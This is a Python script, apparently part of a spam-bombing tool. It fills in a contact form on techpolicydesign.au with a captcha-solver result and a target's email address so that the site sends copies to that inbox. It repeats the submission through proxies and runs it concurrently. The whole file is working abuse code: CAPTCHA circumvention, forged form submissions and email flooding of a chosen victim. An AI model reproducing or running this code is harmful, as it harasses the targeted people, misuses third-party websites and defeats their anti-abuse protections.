from os.path import basename

import requests

import module

GOOGLEKEY = '6LcZk0okAAAAAPv-Ns2npQ8ZVZ5HQRlksOjz-8sA'

PAGEURL = 'https://techpolicydesign.au/atlas-contribution'
cookies = {
    '_gid': 'GA1.2.435566850.1675934922',
    '_ga': 'GA1.1.1830576723.1675331079',
    '_ga_08L0SHT8MD': 'GS1.1.1675934922.3.1.1675936289.0.0.0',
    '_ga_3VBNZWZ9QM': 'GS1.1.1675934920.3.1.1675936358.0.0.0',
}
headers = {
    'authority': 'techpolicydesign.au',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarywFxHwQ7jGiGF9ZLV',
    # 'cookie': '_gid=GA1.2.435566850.1675934922; _ga=GA1.1.1830576723.1675331079; _ga_08L0SHT8MD=GS1.1.1675934922.3.1.1675936289.0.0.0; _ga_3VBNZWZ9QM=GS1.1.1675934920.3.1.1675936358.0.0.0',
    'origin': 'https://techpolicydesign.au',
    'referer': 'https://techpolicydesign.au/atlas-contribution',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}


class ConcreteSpam(module.Spam):

    def post(self, target) -> requests.Response | None:
        cap = self.captcha_solver.solve(GOOGLEKEY, PAGEURL)
        if not cap:
            return
        data = '------WebKitFormBoundarywFxHwQ7jGiGF9ZLV\r\nContent-Disposition: form-data; name="input_3"\r\n\r\ncorrection\r\n------WebKitFormBoundarywFxHwQ7jGiGF9ZLV\r\nContent-Disposition: form-data; name="input_4"\r\n\r\ntest\r\n------WebKitFormBoundarywFxHwQ7jGiGF9ZLV\r\nContent-Disposition: form-data; name="input_5"\r\n\r\ntest\r\n------WebKitFormBoundarywFxHwQ7jGiGF9ZLV\r\nContent-Disposition: form-data; name="input_6"\r\n\r\nDigital Economy\r\n------WebKitFormBoundarywFxHwQ7jGiGF9ZLV\r\nContent-Disposition: form-data; name="input_7"\r\n\r\nExecutive Document\r\n------WebKitFormBoundarywFxHwQ7jGiGF9ZLV\r\nContent-Disposition: form-data; name="input_8"\r\n\r\nhttps://techpolicydesign.au/atlas-contribution\r\n------WebKitFormBoundarywFxHwQ7jGiGF9ZLV\r\nContent-Disposition: form-data; name="input_14"\r\n\r\ntest\r\n------WebKitFormBoundarywFxHwQ7jGiGF9ZLV\r\nContent-Disposition: form-data; name="input_10"\r\n\r\ntest\r\n------WebKitFormBoundarywFxHwQ7jGiGF9ZLV\r\nContent-Disposition: form-data; name="input_11"\r\n\r\ntest\r\n------WebKitFormBoundarywFxHwQ7jGiGF9ZLV\r\nContent-Disposition: form-data; name="input_12"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundarywFxHwQ7jGiGF9ZLV\r\nContent-Disposition: form-data; name="input_13.1"\r\n\r\nEmail me a copy of my responses\r\n------WebKitFormBoundarywFxHwQ7jGiGF9ZLV\r\nContent-Disposition: form-data; name="g-recaptcha-response"\r\n\r\ncap_que\r\n------WebKitFormBoundarywFxHwQ7jGiGF9ZLV\r\nContent-Disposition: form-data; name="is_submit_2"\r\n\r\n1\r\n------WebKitFormBoundarywFxHwQ7jGiGF9ZLV\r\nContent-Disposition: form-data; name="gform_submit"\r\n\r\n2\r\n------WebKitFormBoundarywFxHwQ7jGiGF9ZLV\r\nContent-Disposition: form-data; name="gform_unique_id"\r\n\r\n\r\n------WebKitFormBoundarywFxHwQ7jGiGF9ZLV\r\nContent-Disposition: form-data; name="state_2"\r\n\r\nWyJbXSIsImU0NGIyOGFlZDk5M2FkYzFmNjExMzNjMmVmZDcxNWIyIl0=\r\n------WebKitFormBoundarywFxHwQ7jGiGF9ZLV\r\nContent-Disposition: form-data; name="gform_target_page_number_2"\r\n\r\n0\r\n------WebKitFormBoundarywFxHwQ7jGiGF9ZLV\r\nContent-Disposition: form-data; name="gform_source_page_number_2"\r\n\r\n1\r\n------WebKitFormBoundarywFxHwQ7jGiGF9ZLV\r\nContent-Disposition: form-data; name="gform_field_values"\r\n\r\n\r\n------WebKitFormBoundarywFxHwQ7jGiGF9ZLV\r\nContent-Disposition: form-data; name="gform_uploaded_files"\r\n\r\n\r\n------WebKitFormBoundarywFxHwQ7jGiGF9ZLV\r\nContent-Disposition: form-data; name="ak_hp_textarea"\r\n\r\n\r\n------WebKitFormBoundarywFxHwQ7jGiGF9ZLV\r\nContent-Disposition: form-data; name="ak_js"\r\n\r\n1675936289141\r\n------WebKitFormBoundarywFxHwQ7jGiGF9ZLV--\r\n'

        data = data.replace('wezxasqw@gmail.com', target)
        data = data.replace('test', self.get_text())
        data = data.replace('cap_que', cap)
        for _ in range(15):
            try:
                response = requests.post('https://techpolicydesign.au/atlas-contribution', cookies=cookies,
                                         headers=headers,
                                         data=data.encode(), proxies=self.get_proxies())
                return response
            except Exception as e:
                print(e)
        return


def main():
    s = 'Thank you for contributing'

    spam = ConcreteSpam(basename(__file__)[:-3], s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
